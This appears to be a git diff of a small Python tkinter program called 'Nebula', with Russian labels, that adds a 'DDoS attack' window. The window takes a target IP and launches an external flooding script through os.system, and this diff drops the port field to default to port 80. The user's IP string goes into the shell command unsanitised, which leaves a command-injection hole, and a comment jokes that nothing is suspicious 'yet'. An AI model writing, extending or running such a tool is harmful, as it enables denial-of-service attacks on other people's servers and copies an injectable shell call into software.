@@ -5,7 +5,7 @@ import tkinter.ttk as ttk
 
 
 #import для телеофна
-
+# если вы это видите, git работает. просто тест. ничего подозрительного... пока что
 
 root = Tk()
 top_Frame = Frame(root, bg="#505050")
@@ -49,7 +49,7 @@ class Grip:
 
     def drag_unbind (self, event) :
         self.parent.unbind('<Motion>')
-        if self.releaseCMD != None :
+        if self.releaseCMD is not None:
             self.releaseCMD()
 
 def maildef():
@@ -68,7 +68,7 @@ def maildef():
 
     mclose = Button(m, text='x', font=('Comfortaa', 11, 'bold'), command=lambda: m.destroy(), bg='#49796b',
                     borderwidth=0)
-    mclose.place(x=325, y=1)
+    mclose.place(x=325, y=2)
 
     adentry = Entry(m, width=30)
     adentry.insert(0, 'Адрес..')
@@ -109,57 +109,58 @@ def maildef():
 
 def ddosdef():
     d = Toplevel(root)
-    d.geometry('350x320')
+    d.geometry('200x120')
     dcan = Canvas(d)
     grip3 = Grip(dcan)
-    dcan.create_rectangle(0, 0, 350, 45,
+    dcan.create_rectangle(0, 0, 400, 45,
                             fill="#49796b")
-    dcan.create_rectangle(0, 45, 350, 320,
+    dcan.create_rectangle(0, 45, 400, 320,
                             fill='#333333')
     dcan.pack(fill=BOTH, expand=1)
     d.resizable(False,False)
     d.overrideredirect(True)
     d.geometry('+500+200')
 
+    dtitle = Label(d,text = 'DDOS-атака', font = ('Comfortaa', 16, 'bold'), bg='#49796b')
+    dtitle.place(x=5,y=2)
+
     dclose = Button(d, text='x', font=('Comfortaa', 11, 'bold'), command=lambda: d.destroy(), bg='#49796b',
                    borderwidth=0)
-    dclose.place(x=325, y=1)
+    dclose.place(x=175, y=2)
 
     adentry = Entry(d, width = 30)
     adentry.insert(0, 'IP-адрес..')
-    adentry.place(x=5,y=15)
-    o = adentry.get()
+    adentry.place(x=5,y=50)
 
-    adentry1 = Entry(d,width = 15)
-    adentry1.insert(0, 'Порт..')
-    adentry1.place(x= 200, y =15)
-    oo = adentry1.get()
 
-    def ddosproc(u,y):
+    #adentry1 = Entry(d,width = 15)
+    #adentry1.insert(0, 'Порт..')   Упрощение работы юзера. дефолтный порт = 80.
+    #adentry1.place(x= 200, y =15)
+
+
+    def ddosproc():
         u = adentry.get()
-        y = adentry1.get()
+
         dp1 = 'python ddos/hammer.py -s '
         dp2 = str(u)
-        dp3 = ' -p '
-        dp4 = str(y)
-        dp5 = ' -t 135'
-        dp6=dp1+dp2+dp3+dp4+dp5
 
+        dp6=dp1+dp2
+        d7 = "start cmd /c " + dp6
 
         dscrollbar = Scrollbar(d)
         dscrollbar.pack(side=RIGHT, fill=Y)
 
         dprocess = Listbox(d, yscrollcommand=dscrollbar.set, width=100, height=100)
         dprocess.delete(0, END)
-        output = os.popen(dp6).readlines()
-        for i in output:
-            dprocess.insert(END, i)
-
+        #output = os.popen(dp6).readlines()
+        #for i in output:   Старая реализация
+        #    dprocess.insert(END, i)
+        os.system(d7)
         dprocess.place(x=0, y=45)
         dscrollbar.config(command=dprocess.yview)
 
-    dgo = Button(d, text='Старт', command=lambda: ddosproc(o,oo))
-    dgo.place(x=300, y=13)
+    dgo = Button(d, text='Старт', command=lambda: ddosproc())
+    dgo.place(x=5, y=75)
 
 def phonedef():
     pre = Toplevel(root)
@@ -232,9 +233,9 @@ closebtn.place(x=225,y=2)
 title = Label(canvas,text = 'Nebula', font = ('Comfortaa', 16, 'bold'), bg='#49796b')
 title.place(x=5,y=2)
 
-ver = Label(canvas,text = ' v. 0.1.0', font=('Comic 14 bold italic'), bg='#49796b', fg='#91aea6').place(x=90,y=10)
+ver = Label(canvas,text = ' v. 0.1.1', font=('Comic 14 bold italic'), bg='#49796b', fg='#91aea6').place(x=90,y=10)
 
-cred= Label(text = 'Нашкодил Лэп.', font = ('Comic 8 italic'))
+cred= Label(text = 'от Лэпа с любовью.', font = ('Comic 8 italic'))
 cred.place(x=5,y=300)
 
 phoneimg = PhotoImage(file = 'src2/phone.png')
@@ -246,7 +247,7 @@ phoneprob = Button(canvas,image=phoneimg,borderwidth=0, command = lambda : phone
 ddosprob = Button(canvas,image = ddosimg, borderwidth=0, command = lambda : ddosdef()).place(x=0,y=100)
 mailprob = Button(canvas,image= mailimg, borderwidth = 0, command = lambda :maildef()).place(x=0,y=150)
 
-
+root.attributes('-topmost', True)
 
 
 
